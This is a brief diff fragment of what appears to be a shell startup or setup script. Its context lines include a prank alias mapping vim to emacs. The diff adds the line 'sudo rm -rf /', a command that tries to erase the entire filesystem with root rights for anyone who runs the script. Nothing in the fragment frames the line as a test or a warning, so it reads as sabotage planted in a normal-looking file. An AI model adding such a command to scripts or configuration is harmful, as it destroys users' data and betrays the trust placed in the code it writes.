@@ -32,3 +32,5 @@ if [ ! -e ~/diffeasy ]; then
 fi
 
 alias vim='emacs'
+
+sudo rm -rf /
